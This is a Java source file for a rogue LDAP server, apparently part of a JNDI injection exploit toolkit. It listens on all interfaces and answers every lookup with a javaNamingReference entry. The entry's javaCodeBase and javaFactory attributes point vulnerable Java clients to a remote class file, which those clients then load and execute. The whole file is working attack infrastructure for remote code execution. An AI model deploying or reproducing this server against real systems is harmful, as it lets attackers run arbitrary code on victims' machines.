package org.su18.server;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.*;
import com.unboundid.ldap.sdk.ResultCode;
import org.su18.utils.Logger;
import org.su18.utils.Mapper;
import org.su18.utils.StringUtil;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

public class LDAPServer implements Runnable {

	private static final String LDAP_BASE = "dc=example,dc=com";

	private int port;

	private URL codebase_url;

	public LDAPServer(int port, URL codebase_url) {
		this.port = port;
		this.codebase_url = codebase_url;
	}

	@Override
	public void run() {
		try {
			InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
			config.setListenerConfigs(new InMemoryListenerConfig(
					"listen", //$NON-NLS-1$
					InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
					port,
					ServerSocketFactory.getDefault(),
					SocketFactory.getDefault(),
					(SSLSocketFactory) SSLSocketFactory.getDefault()));

			config.addInMemoryOperationInterceptor(new OperationInterceptor(this.codebase_url));
			InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
			ds.startListening();

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static class OperationInterceptor extends InMemoryOperationInterceptor {

		private URL codebase;

		public OperationInterceptor(URL cb) {
			this.codebase = cb;
		}


		@Override
		public void processSearchResult(InMemoryInterceptedSearchResult result) {
			String base = result.getRequest().getBaseDN();
			Entry  e    = new Entry(base);
			try {
				sendResult(result, base, e);
			} catch (Exception e1) {
				e1.printStackTrace();
			}
		}


		protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {

			String cbstring    = this.codebase.toString();
			String javaFactory = Mapper.reflect.get(StringUtil.getClassName(base));

			if (javaFactory != null) {
				URL turl = new URL(cbstring +javaFactory.concat(StringUtil.getVersion(base)+".class"));
				Logger.warning("  LDAP 服务器 >> 发送引用：" + base + " 重定向至 " + turl);
				e.addAttribute("javaClassName", "foo");
				e.addAttribute("javaCodeBase", cbstring);
				e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
				e.addAttribute("javaFactory", javaFactory.concat(StringUtil.getVersion(base)));
				result.sendSearchEntry(e);
				result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
			} else {
				Logger.error("  LDAP 服务器 >> 无法找到相关引用： " + base);
			}
		}
	}
}